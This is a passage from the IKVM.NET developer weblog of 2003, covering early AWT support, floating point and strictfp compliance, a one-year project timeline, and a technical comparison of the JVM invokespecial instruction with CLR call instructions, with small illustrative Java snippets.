<LI>Having an intellectual and affective artistic content that depends solely on intrinsic form rather than on narrative content or pictorial representation: <I><FONT color=#226699>abstract painting and sculpture.</FONT></I> </LI></OL></DIV>
<P>I always thought that the <EM>abstract </EM>in AWT referred to meaning 4, which is closest to our programmer definition, but maybe the joke's on us and did the original designers (and I use the term loosely) of AWT have meanings 2, 3 and 6 in mind ;-) </P>
<P>As you probably guessed from the above, I did a little work on AWT support. Here are two trivial test apps that I got working: </P>
<P><A href="http://www.frijters.net/AwtTest.java"><IMG src="http://www.frijters.net/awt1.jpg" border=0></A> <BR><A href="http://www.frijters.net/AwtTest.java">AwtTest.java</A>. Getting&nbsp;FontMetrics, Graphics&nbsp;and Frame insets&nbsp;working.&nbsp; </P>
<P><A href="http://www.frijters.net/FlowLayoutTest.java"><IMG src="http://www.frijters.net/awt2.jpg" border=0></A>&nbsp;<BR><A href="http://www.frijters.net/FlowLayoutTest.java">FlowLayoutTest.java</A>. Button, TextField, Label, Panel, FlowLayout and BorderLayout. Also helped me figure out how ambient properties (don't) work. </P>
<P>Please note that only a very small percentage of AWT is implemented at the moment, so don't expect any useful applications to actually work. </P>
<P><STRONG>What else is new?</STRONG> </P>
<UL>
<LI><EM>ikvmc </EM>now uses local variable name debugging information (if available) to name method arguments. 
<LI>Updated to work with current GNU Classpath CVS. 
<LI>Added SO_TIMEOUT and SO_REUSEADDR support to PlainDatagramSocketImpl. </LI></UL>
<P>BTW, the included classpath.dll contains a few Classpath AWT&nbsp;<A href="http://www.frijters.net/awt_20030721.patch">patches </A>that haven't been committed to Classpath CVS yet. </P>
<P>Updated the <A href="http://www.frijters.net/ikvmbin.zip">binaries</A> and source <A href="http://www.frijters.net/ikvm.zip">snapshots</A>. </P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/21/2003 14:13:45 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=69e68e4c-5066-449b-8f03-e0608e6d8fbf"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=69e68e4c-5066-449b-8f03-e0608e6d8fbf">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 10 July 2003</h2></div>
<div class="newsItems"><a name="a6d657cd6-58ac-4a6a-8be9-c3fba167f531"></a><div class="entry">
	<h3 class="entryTitle">Benchmarks, strictfp and other floating point stuff</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        Mark Wielaard did some <a href="http://klomp.org/mark/free-vm-benchmarks/">benchmarks</a> of
        some of the free JVMs available. 
    </p>
    <p>
        I noted on the Classpath mailing list that the IKVM floating point performance is
        probably overstated, because IKVM doesn't implement FP correctly. It uses the .NET
        framework FP instructions and methods and those in turn are implemented using the
        x86 FP instructions. 
    </p>
    <p>
        The original JVM specification was very strict in specifying floating point operations.
        Basically, it mapped 100% onto the Sparc floating point model and this caused spec
        compliant FP code to be slow on Intel. I don't think any of the early VMs correctly
        implemented the spec so this wasn't really a problem. I don't know why early the VM
        implementers didn't implement the spec, maybe they felt the performance cost was too
        high or maybe they just didn't find it an interesting issue (the "problem" is that
        the Intel FP results are actually <i style="mso-bidi-font-style: normal">too</i> accurate). 
    </p>
    <p>
        In JDK 1.2 Sun introduced the <i style="mso-bidi-font-style: normal">strictfp</i> keyword
        and corresponding JVM method and class access flag. Interestingly, they loosened the
        default FP requirements and specified the original FP behavior for methods (or classes)
        marked with the <i style="mso-bidi-font-style: normal">strictfp</i> keyword. 
    </p>
    <p>
        IKVM doesn't implement <i style="mso-bidi-font-style: normal">strictfp</i> at the
        moment, but this isn't the whole story. For trigonometric* functions (e.g. Math.sin())
        IKVM uses the equivalent .NET Math functions and those are (probably) implemented
        using the x86 FP instructions and these are not compliant with the JVM specification
        and I think that in this case the Intel instructions are not more accurate than required,
        but actually less accurate. So this is a real problem that should be fixed at some
        point in the future. 
    </p>
    <p>
        *This probably also applies to other Math functions, like Math.exp, Math.log, Math.sqrt,
        etc. 
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		07/10/2003 11:08:38 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=6d657cd6-58ac-4a6a-8be9-c3fba167f531"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=6d657cd6-58ac-4a6a-8be9-c3fba167f531">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 19 June 2003</h2></div>
<div class="newsItems"><a name="a2ce7acc7-ee62-4853-917f-21967de46e94"></a><div class="entry">
	<h3 class="entryTitle">One Year Ago Today</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        It's been exactly one year since I started blogging about the development of IKVM.NET.
        I actually started development about a month earlier on the 22<sup>nd</sup> of May. 
    </p>
    <p>
        To celebrate this, I've created a time-line of significant (or interesting) events
        that happened in the past&#160;year. 
    </p>
    <p>
    </p>
    <table cellspacing="8" cellpadding="0" border="0">
        <tbody>
            <tr>
                <td valign="top" nowrap="nowrap">
                    <p>
                        2002-05-22 
                    </p>
                </td>
                <td>
                    <p>
                        Started development on a project called "bytecode". I started by porting my <a href="http://www.softwaresummit.com/1999/1999/speakers/frijters.htm">Java
                        class file reader</a> from Java to C#.<br />
                    </p>
                </td>
            </tr>
            <tr>
                <td valign="top" nowrap="nowrap">
                    <p>
                        <a href="http://weblog.ikvm.net/default.aspx?date=2002-06-19T00:00:00">2002-06-19</a> 
                    </p>
                </td>
                <td>
                    <p>
                        Started my IK&lt;&lt;VM.NET Radio weblog about "The Development of a Java VM for .NET"<br />
                    </p>
                </td>
            </tr>
            <tr>
                <td valign="top" nowrap="nowrap">
                    <p>
                        <a href="http://weblog.ikvm.net/default.aspx?date=2002-06-27T00:00:00">2002-06-27</a> 
                    </p>
                </td>
                <td>
                    <p>
                        "Hello, World!" runs for the very first time. Replaced the &lt;&lt; in the name with
                        a dot, because Radio doesn't escape the title properly.<br />
                    </p>
                </td>
            </tr>
            <tr>
                <td valign="top" nowrap="nowrap">
                    <p>
                        <a href="http://weblog.ikvm.net/default.aspx?date=2002-08-07T00:00:00">2002-08-07</a> 
                    </p>
                </td>
                <td>
                    <p>
                        First version of netexp is released. Java code can now directly use .NET types.<br />
                    </p>
                </td>
            </tr>
            <tr>
                <td valign="top" nowrap="nowrap">
                    <p>
                        <a href="http://weblog.ikvm.net/default.aspx?date=2002-08-12T00:00:00">2002-08-12</a> 
                    </p>
                </td>
                <td>
                    <p>
                        The static compiles makes its appearance. For the first time the binary snapshot contains
                        a statically compiled classpath.dll.<br />
                    </p>
                </td>
            </tr>
            <tr>
                <td valign="top" nowrap="nowrap">
                    <p>
                        <a href="http://weblog.ikvm.net/default.aspx?date=2002-09-03T00:00:00">2002-09-03</a> 
                    </p>
                </td>
                <td>
                    <p>
                        Very basic AWT support is introduced.<br />
                    </p>
                </td>
            </tr>
            <tr>
                <td valign="top" nowrap="nowrap">
                    <p>
                        <a href="http://weblog.ikvm.net/default.aspx?date=2002-09-09T00:00:00">2002-09-09</a> 
                    </p>
                </td>
                <td>
                    <p>
                        Class loader support makes its first appearance.<br />
                    </p>
                </td>
            </tr>
            <tr>
                <td valign="top" nowrap="nowrap">
                    <p>
                        <a href="http://weblog.ikvm.net/default.aspx?date=2002-10-25T00:00:00">2002-10-25</a> 
                    </p>
                </td>
                <td>
                    <p>
                        <a href="http://james.apache.org/">James</a> runs!<br />
                    </p>
                </td>
            </tr>
            <tr>
                <td valign="top" nowrap="nowrap">
                    <p>
                        <a href="http://weblog.ikvm.net/default.aspx?date=2002-11-01T00:00:00">2002-11-01</a> 
                    </p>
                </td>
                <td>
                    <p>
                        Zoltan Varga starts to work on getting IKVM to run on <a href="http://www.go-mono.org/">Mono</a>.<br />
                    </p>
                </td>
            </tr>
            <tr>
                <td valign="top" nowrap="nowrap">
                    <p>
                        <a href="http://weblog.ikvm.net/default.aspx?date=2002-12-19T00:00:00">2002-12-19</a> 
                    </p>
                </td>
                <td>
                    <p>
                        Created the IKVM.NET SourceForge <a href="http://sourceforge.net/projects/ikvm/">project</a>.
                        Dropped the first dot from the name.<br />
                    </p>
                </td>
            </tr>
            <tr>
                <td valign="top" nowrap="nowrap">
                    <p>
                        <a href="http://weblog.ikvm.net/default.aspx?date=2002-12-28T00:00:00">2002-12-28</a> 
                    </p>
                </td>
                <td>
                    <p>
                        <a href="http://www.eclipse.org/">Eclipse</a> starts up!<br />
                    </p>
                </td>
            </tr>
            <tr>
                <td valign="top" nowrap="nowrap">
                    <p>
                        <a href="http://weblog.ikvm.net/default.aspx?date=2003-01-17T00:00:00">2003-01-17</a> 
                    </p>
                </td>
                <td>
                    <p>
                        Zoltan Varga gets IKVM to run HelloWorld on <a href="http://www.go-mono.org/">Mono</a>.<br />
                    </p>
                </td>
            </tr>
            <tr>
                <td valign="top" nowrap="nowrap">
                    <p>
                        <a href="http://weblog.ikvm.net/default.aspx?date=2003-03-13T00:00:00">2003-03-13</a> 
                    </p>
                </td>
                <td>
                    <p>
                        Moved blog from Radio to <a href="http://www.simplegeek.com/">BlogX</a>.<br />
                    </p>
                </td>
            </tr>
            <tr>
                <td valign="top" nowrap="nowrap">
                    <p>
                        <a href="http://weblog.ikvm.net/default.aspx?date=2003-04-05T00:00:00">2003-04-05</a> 
                    </p>
                </td>
                <td>
                    <p>
                        Added support for using value types from Java.<br />
                    </p>
                </td>
            </tr>
            <tr>
                <td valign="top" nowrap="nowrap">
                    <p>
                        <a href="http://weblog.ikvm.net/default.aspx?date=2003-05-10T00:00:00">2003-05-10</a> 
                    </p>
                </td>
                <td>
                    <p>
                        Zoltan Varga gets IKVM to run <a href="http://www.eclipse.org/">Eclipse</a> on <a href="http://www.go-mono.org/">Mono</a>.<br />
                    </p>
                </td>
            </tr>
            <tr>
                <td valign="top" nowrap="nowrap">
                    <p>
                        <a href="http://weblog.ikvm.net/default.aspx?date=2003-06-19T00:00:00">2003-06-19</a> 
                    </p>
                </td>
                <td>
                    <p>
                        The IKVM.NET blog celebrates its first birthday. 
                    </p>
                </td>
            </tr>
        </tbody>
    </table>
    <p>
    </p>
    <p>
        Thanks to everyone who contributed to IKVM.NET in the past year. It's been great fun
        and I hope the coming year will be as productive as this past year has been. 
    </p>
</body>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/19/2003 11:22:49 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=2ce7acc7-ee62-4853-917f-21967de46e94"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=2ce7acc7-ee62-4853-917f-21967de46e94">Comments [4]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 02 June 2003</h2></div>
<div class="newsItems"><a name="a99fcff6c-8ab7-4358-9467-ddf71dd20acd"></a><div class="entry">
	<h3 class="entryTitle">Invokespecial</h3>
	<div class="entryBody">
		<body xmlns="http://www.w3.org/1999/xhtml">
    <p>
        One of the more interesting bytecode instructions is <i>invokespecial.</i> During
        Java's early days this instruction was called <i>invokenonvirtual</i>, but in JDK
        1.0.2 it was renamed to <i>invokespecial</i> to indicate it has some very special
        semantics. 
    </p>
    <p>
    </p>
    <p>
        <i>Invokespecial</i> is used in three ways, to call instance initializers (constructors), <span style="mso-spacerun: yes">&#160;</span>to
        call base class methods non-virtually and to call private methods. It's worth mentioning
        that, unlike the CLR <i>call</i> instruction, <i>invokespecial</i> cannot be used
        to call arbitrary methods, it can only call methods in the current class or in a base
        class of of the current class (and then only on references of the type of the current
        class, or subclasses of it). The JVM's i<i>nvokevirtual</i> is very similar to the
        CLR's <i>callvirt</i> instruction. In addition to <i>invokespecial</i> and <i>invokevirtual</i>,
        the JVM also has <i>invokestatic</i> and <i>invokeinterface</i> to invoke static methods
        and interface methods, respectively. The CLR has no special instructions for that,
        it uses the <i>call</i> and <i>callvirt</i> instructions to call static and interface
        methods. 
    </p>
    <p>
    </p>
    <p>
        Prior to JDK 1.1, <i>invokespecial</i> called the exact method specified in the instruction.
        In JDK 1.1 this behavior was changed, because it caused versioning problems. Here
        is an example of what could go wrong: 
    </p>
    <p>
    </p>
    <p>
        Component A - version 1 
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0"><span style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: 'Courier New'">public
        class</span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"> GrandParent
        {<br />
        </span><span style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160; </span>protected</span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"> <span style="COLOR: blue">void</span> myMethod()
        {<br />
        </span><span style="FONT-SIZE: 10pt; COLOR: green; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>//
        ...<br />
        </span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160; </span>}<br />
        </span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">}<br />
        </span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"></span><span style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: 'Courier New'">public
        class</span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"> Parent <span style="COLOR: blue">extends</span> GrandParent
        {<br />
        </span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">}<br />
        </span>
    </div>
    <p>
    </p>
    <p>
        Component B 
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0"><span style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: 'Courier New'">public
        class</span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"> Child <span style="COLOR: blue">extends</span> Parent
        {<br />
        </span><span style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160; </span>protected</span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"> <span style="COLOR: blue">void</span> myMethod()
        {<br />
        </span><span style="FONT-SIZE: 10pt; COLOR: green; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>//
        ...<br />
        </span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span><span style="COLOR: blue">super</span>.myMethod();<br />
        </span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160; </span>}<br />
        </span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">}<br />
        </span>
    </div>
    <p>
    </p>
    <p>
        The compiler would compile the <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">super.myMethod()</span> call
        in Child to <i>invokespecial</i> <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">GrandParent.myMethod()</span>.
        Now suppose a new version of Component A is released: 
    </p>
    <p>
    </p>
    <p>
        Component A - version 2 
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0"><span style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: 'Courier New'">public
        class</span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"> GrandParent
        {<br />
        </span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160; </span><span style="COLOR: blue">protected</span> <span style="COLOR: blue">void</span> myMethod()
        {<br />
        </span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span><span style="COLOR: green">//
        ...<br />
        </span></span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160; </span>}<br />
        </span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">}<br />
        </span><span style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: 'Courier New'">public
        class</span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"> Parent <span style="COLOR: blue">extends</span> GrandParent
        {<br />
        </span><span style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160; </span>protected</span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"> <span style="COLOR: blue">void</span> myMethod()
        {<br />
        </span><span style="FONT-SIZE: 10pt; COLOR: green; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>//
        ...<br />
        </span><span style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span>super</span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">.myMethod();<br />
        </span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160; </span>}<br />
        </span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">}<br />
        </span>
    </div>
    <p>
    </p>
    <p>
        When Component B is used (without recompiling) with this new version of Component
        A, the <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">super.myMethod</span> call
        in <font face="Courier New" size="2">Child</font> will still go directly to <span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'">GrandParent.myMethod</span> and
        this is probably not what the author of Component A had intended. 
    </p>
    <p>
        To fix this, <i>invokespecial</i> was changed to search the class hierarchy if the
        called class is a base class of the caller (from the caller's base class on up), but
        only if the caller's class has the ACC_SUPER bit set in the class' access_flags mask.
        All Java compilers since JDK 1.1 always set the ACC_SUPER flag. It's interesting to
        note that the current Sun JRE 1.4.1 still honors a cleared ACC_SUPER flag. 
    </p>
    <p>
    </p>
    <p>
        Why doesn't the CLR have an equivalent of the ACC_SUPER flag? The reason is that it
        isn't needed. When, for example, the C# compiler compiles a base method call, it emits
        a <i>call</i> instruction to the immediate base class of the caller, <b style="mso-bidi-font-weight: normal">even
        if that class isn't the one that implements the called method[1]</b>. When the JIT
        is resolving the call it searches up the class hierarchy to find the actual method. 
    </p>
    <p>
    </p>
    <p>
        Comparison JVM and CLR call instructions 
    </p>
    <table class="MsoTableGrid" style="BORDER-RIGHT: medium none; BORDER-TOP: medium none; BORDER-LEFT: medium none; BORDER-BOTTOM: medium none; BORDER-COLLAPSE: collapse; mso-border-alt: solid windowtext .5pt; mso-padding-alt: 0in 5.4pt 0in 5.4pt; mso-yfti-tbllook: 480; mso-border-insideh: .5pt solid windowtext; mso-border-insidev: .5pt solid windowtext" cellspacing="0" cellpadding="0" border="1">
        <tbody>
            <tr style="mso-yfti-irow: 0; mso-yfti-firstrow: yes">
                <td style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: windowtext 1pt solid; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: windowtext 1pt solid; WIDTH: 142.05pt; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt" valign="top" width="189">
                    <p>
                        <b style="mso-bidi-font-weight: normal">JVM </b>
                    </p>
                </td>
                <td style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: windowtext 1pt solid; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 142.1pt; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" valign="top" width="189">
                    <p>
                        <b style="mso-bidi-font-weight: normal">CLR </b>
                    </p>
                </td>
                <td style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: windowtext 1pt solid; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 142.1pt; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt" valign="top" width="189">
                    <p>
                        <b style="mso-bidi-font-weight: normal">Notes </b>
                    </p>
                </td>
            </tr>
            <tr style="mso-yfti-irow: 1">
                <td style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: windowtext 1pt solid; WIDTH: 142.05pt; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt" valign="top" width="189">
                    <p>
                        invokespecial 
                    </p>
                </td>
                <td style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 142.1pt; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt" valign="top" width="189">
                    <p>
                        call 
                    </p>
                </td>
                <td style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 142.1pt; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt" valign="top" width="189">
                    <p>
                        invokespecial checks the object reference for null, call doesn't. 
                    </p>
                </td>
            </tr>
            <tr style="mso-yfti-irow: 2">
                <td style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: windowtext 1pt solid; WIDTH: 142.05pt; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt" valign="top" width="189">
                    <p>
                        invokevirtual 
                    </p>
                </td>
                <td style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 142.1pt; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt" valign="top" width="189">
                    <p>
                        callvirt 
                    </p>
                </td>
                <td style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 142.1pt; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt" valign="top" width="189">
                    <p>
                    </p>
                </td>
            </tr>
            <tr style="mso-yfti-irow: 3">
                <td style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: windowtext 1pt solid; WIDTH: 142.05pt; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt" valign="top" width="189">
                    <p>
                        invokeinterface 
                    </p>
                </td>
                <td style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 142.1pt; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt" valign="top" width="189">
                    <p>
                        callvirt 
                    </p>
                </td>
                <td style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 142.1pt; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt" valign="top" width="189">
                    <p>
                        Like in other places where the JVM consumes interface references, the object reference
                        doesn't have to statically implement the called interface type. 
                    </p>
                </td>
            </tr>
            <tr style="mso-yfti-irow: 4; mso-yfti-lastrow: yes">
                <td style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: windowtext 1pt solid; WIDTH: 142.05pt; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt" valign="top" width="189">
                    <p>
                        invokestatic 
                    </p>
                </td>
                <td style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 142.1pt; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt" valign="top" width="189">
                    <p>
                        call 
                    </p>
                </td>
                <td style="BORDER-RIGHT: windowtext 1pt solid; PADDING-RIGHT: 5.4pt; BORDER-TOP: #ece9d8; PADDING-LEFT: 5.4pt; PADDING-BOTTOM: 0in; BORDER-LEFT: #ece9d8; WIDTH: 142.1pt; PADDING-TOP: 0in; BORDER-BOTTOM: windowtext 1pt solid; BACKGROUND-COLOR: transparent; mso-border-alt: solid windowtext .5pt; mso-border-left-alt: solid windowtext .5pt; mso-border-top-alt: solid windowtext .5pt" valign="top" width="189">
                    <p>
                    </p>
                </td>
            </tr>
        </tbody>
    </table>
    <p>
    </p>
    <p>
        One final issue relevant to IKVM here is that <em>invokespecial</em> requires the
        object reference to be checked for null, the CLR <i>call</i> instruction doesn't do
        this (for this reason the C# compiler uses <i>callvirt</i> when calling non-virtual
        methods, except when explicitly calling a base class method of course, it always makes
        sure the object reference isn't null). The IKVM compiler has to insert an explicit
        check for null references when it is compiling <i>invokespecial</i>. It took me a
        while to come up with an efficient way of doing this. Javac faces a similar issue
        when it compiles the explicit instantation of an inner class: 
    </p>
    <p>
    </p>
    <div style="MARGIN-LEFT: 20px; BORDER-LEFT: gray 1px solid; BACKGROUND-COLOR: #f0f0f0"><span style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: 'Courier New'">public
        class</span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"> Foo {<br />
        </span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160; </span><span style="COLOR: blue">public
        class</span> Inner {}<br />
        </span><span style="FONT-SIZE: 10pt; COLOR: blue; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160; </span>static
        void</span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"> method() {<br />
        </span><span style="FONT-SIZE: 10pt; FONT-FAMILY: 'Courier New'"><span style="mso-spacerun: yes">&#160;&#160;&#160; </span><span style="COLOR: green">//
        next line throws a NullPointerException</span> 
        <br />
